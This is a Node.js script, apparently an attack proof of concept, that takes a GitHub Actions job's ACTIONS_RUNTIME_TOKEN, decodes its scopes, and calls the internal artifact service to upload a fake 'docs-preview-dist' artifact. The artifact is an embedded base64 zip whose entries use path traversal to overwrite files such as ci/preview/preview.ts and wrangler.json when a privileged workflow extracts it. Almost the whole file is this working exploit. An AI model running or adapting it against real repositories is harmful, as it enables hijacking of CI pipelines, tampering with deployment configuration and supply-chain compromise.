const ZIP = Buffer.from(
  'UEsDBBQAAAAIAOiRXV09pHBEFwAAABUAAAAeAAAAeC8uLi8uLi8uLi8uLi9lc2NhcGVkLXJvb3QudHh0Cwj3c3XRDQlyDHMNCnb00Q3y9w/hAgBQSwMEFAAAAAgA6JFdXVO3VIMbAAAAGQAAAB8AAAB4Ly4uLy4uLy4uL2VzY2FwZWQtcGFja2FnZXMudHh0Cwj3c3XRDQlyDHMNCnb00Q1wdPZ2dHcN5gIAUEsDBBQAAAAIAOiRXV2BOpOCcAAAAIYAAAAjAAAAeC8uLi8uLi8uLi8uLi9jaS9wcmV2aWV3L3ByZXZpZXcudHNVjEEKAjEMRfdziuxiUeYAom7GblVUcCmhRgmMaUljz29XgsvPe+/Lu2RzyHUoJuoLPN0Ocb8Gt091fkBNJsXBuMyU+m5CQObypORdosZWacbwy4/T/RKnc7xuEZb9d2RtYlnHF/9hXOFGs/IOQxi+UEsDBBQAAAAIAOiRXV1/HZezHAAAABoAAAAWAAAAeC8uLi8uLi93cmFuZ2xlci5qc29uY6tWyk0syk4tUrJSCgj3c3XRdfb3c/N0V6rlAgBQSwECFAMUAAAACADokV1dPaRwRBcAAAAVAAAAHgAAAAAAAAAAAAAAgAEAAAAAeC8uLi8uLi8uLi8uLi9lc2NhcGVkLXJvb3QudHh0UEsBAhQDFAAAAAgA6JFdXVO3VIMbAAAAGQAAAB8AAAAAAAAAAAAAAIABUwAAAHgvLi4vLi4vLi4vZXNjYXBlZC1wYWNrYWdlcy50eHRQSwECFAMUAAAACADokV1dgTqTgnAAAACGAAAAIwAAAAAAAAAAAAAAgAGrAAAAeC8uLi8uLi8uLi8uLi9jaS9wcmV2aWV3L3ByZXZpZXcudHNQSwECFAMUAAAACADokV1dfx2XsxwAAAAaAAAAFgAAAAAAAAAAAAAAgAFcAQAAeC8uLi8uLi93cmFuZ2xlci5qc29uY1BLBQYAAAAABAAEAC4BAACsAQAAAAA=',
  'base64'
);

const KEYS = ['ACTIONS_RUNTIME_TOKEN', 'ACTIONS_RESULTS_URL', 'ACTIONS_RUNTIME_URL', 'ACTIONS_CACHE_URL', 'GITHUB_RUN_ID'];
console.log('env presence:', Object.fromEntries(KEYS.map(k => [k, process.env[k] ? 'present' : 'absent'])));

const token = process.env.ACTIONS_RUNTIME_TOKEN;
const base = (process.env.ACTIONS_RESULTS_URL || process.env.ACTIONS_RUNTIME_URL || '').replace(/\/$/, '');
if (!token || !base) { console.log('no runtime token/url available'); process.exit(0); }

const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
let runId, jobId;
for (const part of (claims.scp || '').split(' ')) {
  const p = part.split(':');
  if (p[0] === 'Actions.Results' && p.length === 3) { runId = p[1]; jobId = p[2]; }
}
if (!runId) { console.log('no Actions.Results scope'); process.exit(0); }

async function twirp(method, body) {
  const r = await fetch(`${base}/twirp/github.actions.results.api.v1.ArtifactService/${method}`, {
    method: 'POST',
    headers: { Authorization: `Bearer ${token}`, 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const text = await r.text();
  console.log(method, r.status, text.slice(0, 300));
  return JSON.parse(text);
}

(async () => {
  const created = await twirp('CreateArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'docs-preview-dist',
    version: 4,
  });
  const signed = created.signedUploadUrl || created.signed_upload_url;
  const put = await fetch(signed, {
    method: 'PUT',
    headers: { 'x-ms-blob-type': 'BlockBlob', 'Content-Type': 'application/zip' },
    body: ZIP,
  });
  console.log('blob put', put.status);
  await twirp('FinalizeArtifact', {
    workflowRunBackendId: runId,
    workflowJobRunBackendId: jobId,
    name: 'docs-preview-dist',
    size: String(ZIP.length),
  });
})().catch(e => { console.error(e); process.exit(1); });
